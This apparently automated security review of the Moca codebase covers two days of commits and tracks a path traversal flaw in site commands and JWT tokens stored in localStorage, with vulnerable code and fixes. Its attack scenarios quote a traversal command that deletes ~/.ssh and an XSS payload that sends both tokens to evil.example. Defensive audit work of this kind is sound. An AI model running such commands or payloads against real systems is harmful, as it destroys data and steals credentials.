# Security Review — 2026-04-09

**Scan Date:** 2026-04-09  
**Reviewer:** Automated sec-ops scheduled task  
**Commits Reviewed:** All commits merged to `main` in the last 24 hours  
**Commits of Interest:**
- `f44bc1c` — `fix: path traversal remediation via pkg/sitepath`
- `f59c4b3` — `feat: release module version contract enforcement`
- `af09fef` — `feat: standalone app scaffold go.mod generation`

---

## Summary (2026-04-09)

No new HIGH or CRITICAL vulnerabilities were introduced in the last 24 hours.

**SEC-001 (Path Traversal — tracked in 2026-04-08 review) is now RESOLVED** via commit `f44bc1c`. The new `pkg/sitepath` package enforces whitelist-based name validation and filesystem boundary checks across all 10 previously affected code paths.

**SEC-002 (JWT tokens in localStorage — tracked in 2026-04-08 review) remains OPEN.** No changes to `desk/src/api/client.ts` or the auth token storage strategy were made in today's commits.

The two additional commits (`f59c4b3`, `af09fef`) improve release-engineering and dependency management hygiene. No security vulnerabilities were introduced.

### Updated Finding Status

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| SEC-001 | Path Traversal via Unsanitised Site Name | High | ✅ RESOLVED (`f44bc1c`) |
| SEC-002 | JWT Tokens in Browser localStorage | High | ⚠️ OPEN (no fix merged) |

### Top Risky Areas Reviewed (2026-04-09 commits)

- `pkg/sitepath/sitepath.go` (new) — path traversal remediation; fix validated correct
- `internal/releaseverify/main.go` (new) — module version contract; no vulnerabilities
- `cmd/moca/app.go` — scaffold framework dependency resolution; no vulnerabilities
- `.github/workflows/release.yml` — release pipeline; no vulnerabilities

### Gaps & Uncertainty

- **SEC-002 remains unresolved.** The `desk/src/api/client.ts` localStorage pattern persists; any XSS in the Desk frontend gives an attacker both JWT tokens. This is the highest-priority outstanding security item.
- The `moca site rename` path identified in yesterday's review (pre-existing issue, not newly introduced) was not patched in today's commits. Confirm whether `pkg/sitepath` was retrofitted to that path.

### Recommended Follow-Up

1. Prioritise SEC-002 remediation — replace `localStorage` token persistence with the existing `HttpOnly` session cookie or an in-memory-only token refresh flow.
2. Confirm `moca site rename` in `pkg/tenancy/manager.go` (~line 516) now routes through `sitepath.SiteDirPath()`.
3. Add a fuzz test for `sitepath.ValidateSiteName` (Unicode, null bytes, overlong inputs).

---

---

# Security Review — 2026-04-08

**Scan Date:** 2026-04-08  
**Reviewer:** Automated sec-ops scheduled task  
**Commits Reviewed:** All commits merged to `main` in the last 24 hours  
**Primary Commit of Interest:** `4a3d746` — `feat: seed DocType document records + persist JWT tokens on reload`

---

## Summary

Two security vulnerabilities were identified in changes merged in the last 24 hours. One is **HIGH** severity (path traversal via unsanitized site name in filesystem operations) and one is **HIGH** severity (JWT token persistence in browser `localStorage`). Both findings have real exploitability in this codebase. No critical findings were identified.

---

## Findings

---

### [SEC-001] Path Traversal via Unsanitized Site Name in Filesystem Operations

| Field | Detail |
|-------|--------|
| **Severity** | High |
| **Confidence** | High |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| **Release Blocker** | Yes |
| **Introduced In** | Commit `4a3d746` |

**Affected Files & Lines**

- `cmd/moca/site.go` — Lines ~140–144 (`moca site create` directory creation)
- `cmd/moca/site.go` — Lines ~235–239 (`moca site drop` directory removal)
- `pkg/tenancy/manager.go` — Lines 706–717 (`validateSiteConfig` — no path sanitization)

**Vulnerable Code**

```go
// cmd/moca/site.go — site create (introduced in 4a3d746)
siteDir := filepath.Join(ctx.ProjectRoot, "sites", siteName)
if mkErr := os.MkdirAll(siteDir, 0o755); mkErr != nil {
    w.PrintWarning(fmt.Sprintf("Could not create site directory: %v", mkErr))
}

// cmd/moca/site.go — site drop (introduced in 4a3d746)
siteDir := filepath.Join(ctx.ProjectRoot, "sites", siteName)
if rmErr := os.RemoveAll(siteDir); rmErr != nil {
    w.PrintWarning(fmt.Sprintf("Could not remove site directory: %v", rmErr))
}

// pkg/tenancy/manager.go — validateSiteConfig (pre-existing, unchanged)
func validateSiteConfig(cfg SiteCreateConfig) error {
    if cfg.Name == "" {
        return fmt.Errorf("site name is required")  // only validation
    }
    // ...
}
```

**Why This Is Exploitable**

`siteName` flows directly from CLI argument (`args[0]`) through `validateSiteConfig` — which only checks for empty string — into `filepath.Join`. Although `filepath.Join` cleans the path, it does **not** prevent traversal above `ctx.ProjectRoot` when an absolute path (e.g. `/tmp/evil`) or a traversal string with extra path components is supplied. Specifically:

- `filepath.Join("/project", "sites", "/etc")` → `/etc` (absolute paths are not jailed)
- `filepath.Join("/project", "sites", "../../../etc/cron.d")` → `/etc/cron.d` (traversal)

Note: `sanitizeForSchema` correctly sanitizes names for PostgreSQL schema use, but this sanitization is **not applied** to the `siteName` variable used in the filesystem path.

**Attack Scenario**

An authenticated developer or CI pipeline operator with CLI access runs:
```
moca site drop '../../../home/ubuntu/.ssh'
```
This causes `os.RemoveAll` to recursively delete `~/.ssh`, destroying SSH access. A more targeted attack using:
```
moca site create '../../apps/core'
```
creates a directory that conflicts with real application directories, causing subsequent build failures or data corruption. If the CLI runs under an account with broad file permissions (e.g. `root` in a container), the blast radius extends to any path on the filesystem.

**Remediation**

1. Add path traversal prevention to `validateSiteConfig`:

```go
import "regexp"

var validSiteNameRe = regexp.MustCompile(`^[a-z][a-z0-9\-\.]{0,61}[a-z0-9]$`)

func validateSiteConfig(cfg SiteCreateConfig) error {
    if cfg.Name == "" {
        return fmt.Errorf("site name is required")
    }
    if !validSiteNameRe.MatchString(strings.ToLower(cfg.Name)) {
        return fmt.Errorf("site name %q is invalid: must match ^[a-z][a-z0-9\\-\\.]{0,61}[a-z0-9]$", cfg.Name)
    }
    // ... rest of validation
}
```

2. Add a path-escape guard in `cmd/moca/site.go` before any filesystem operation:

```go
siteDir := filepath.Join(ctx.ProjectRoot, "sites", siteName)
absRoot := filepath.Join(ctx.ProjectRoot, "sites") + string(filepath.Separator)
absSiteDir, err := filepath.Abs(siteDir)
if err != nil || !strings.HasPrefix(absSiteDir+string(filepath.Separator), absRoot) {
    return fmt.Errorf("site name %q resolves outside the project boundary", siteName)
}
```

---

### [SEC-002] JWT Access & Refresh Tokens Stored in Browser localStorage

| Field | Detail |
|-------|--------|
| **Severity** | High |
| **Confidence** | High |
| **CWE** | CWE-922: Insecure Storage of Sensitive Information |
| **Release Blocker** | Yes |
| **Introduced In** | Commit `4a3d746` (desk submodule at `804f4f3`) |

**Affected File**

- `desk/src/api/client.ts` — Token read/write functions using `localStorage`

**Vulnerable Code**

```typescript
// desk/src/api/client.ts
let accessToken: string | null = localStorage.getItem("moca_access_token");
let refreshToken: string | null = localStorage.getItem("moca_refresh_token");

export function setAccessToken(token: string | null): void {
  accessToken = token;
  if (token) {
    localStorage.setItem("moca_access_token", token);
  } else {
    localStorage.removeItem("moca_access_token");
  }
}
```

**Why This Is Exploitable**

`localStorage` is accessible to any JavaScript executing on the page origin. Unlike the existing `moca_sid` session cookie (which is already correctly configured with `HttpOnly: true` and `SameSite: Lax` in `pkg/api/auth_handler.go`), tokens in `localStorage` are fully exposed to JavaScript. A single XSS vulnerability anywhere in the Desk frontend — in any third-party React dependency, in a user-controlled doctype field rendered without sanitization, or in any future template — would allow an attacker to:

- Read `moca_access_token` and `moca_refresh_token` directly
- Exfiltrate both tokens to an attacker-controlled server
- Use the refresh token to continuously generate new access tokens even after the victim's session is otherwise terminated

The tokens persist across browser restarts, extending the window of compromise indefinitely until the user explicitly logs out.

**Attack Scenario**

A Moca tenant stores a custom text field value that is rendered without escaping into the Desk list view (a pattern common in MetaType-driven UIs). An attacker saves `<img src=x onerror="fetch('https://evil.example/steal?t='+localStorage.getItem('moca_access_token')+'&r='+localStorage.getItem('moca_refresh_token'))">` as a record value. Any admin visiting the list view triggers the payload, silently exfiltrating both JWT tokens. The attacker then uses the refresh token to maintain persistent API access with admin-level privileges across all doctypes the victim could access.

**Remediation**

The preferred fix is to replace `localStorage` persistence with the already-existing `HttpOnly` session cookie (`moca_sid`), which cannot be read by JavaScript. The JWT tokens do not need to survive a page reload independently — the session cookie can be used to re-issue them via the `/api/method/moca.auth.get_session` endpoint (or equivalent):

```typescript
// Remove localStorage persistence entirely.
// On page load, call the session endpoint to re-hydrate tokens:
async function hydrateSession(): Promise<void> {
  const res = await apiClient.get("/api/method/moca.auth.get_session");
  if (res.data?.access_token) {
    setAccessToken(res.data.access_token); // in-memory only, no localStorage
  }
}
```

If localStorage persistence is required for offline or PWA use cases, tokens must be encrypted before storage using the Web Crypto API with a key derived from a user-specific secret not stored in the browser.

---

## Top Risky Areas Reviewed

- `cmd/moca/site.go` — Filesystem operations keyed on user-supplied site names
- `pkg/tenancy/manager.go` — Site name validation and schema management
- `desk/src/api/client.ts` — Frontend auth token management
- `pkg/api/auth_handler.go` — Session cookie configuration (no issues found — correctly hardened)
- `pkg/orm/` — Database query construction (no new issues in reviewed commits)

## Gaps & Uncertainty

- The desk submodule (`804f4f3`) was reviewed based on the diff context and file content provided by the agent. Direct inspection of all desk submodule files was not performed — there may be additional XSS surface in React components that render user-controlled MetaType field values.
- The `moca site rename` path in `pkg/tenancy/manager.go` lines 516–531 uses `filepath.Join(projectRoot, "sites", oldName/newName)` and is subject to the same path traversal risk. It was not introduced in the reviewed commits but is worth remediating alongside SEC-001.
- No Kafka, Redis Streams, or background job changes were introduced in the reviewed commits.

## Recommended Follow-Up Checks

1. **Audit all MetaType field renderers** in the Desk frontend for proper output encoding / XSS prevention — especially `Link`, `Text`, and `HTML` field types. This is the primary XSS attack surface that makes SEC-002 exploitable.
2. **Review `moca site rename`** (`pkg/tenancy/manager.go` ~line 516) for the same path traversal pattern and apply the same fix as SEC-001.
3. **Add a CSP header** (`Content-Security-Policy`) to the Desk HTTP response to limit script execution sources and reduce XSS exploitability as a defence-in-depth measure.
4. **Verify no other CLI commands** pass user-supplied names into `filepath.Join` without the same guard added for SEC-001.
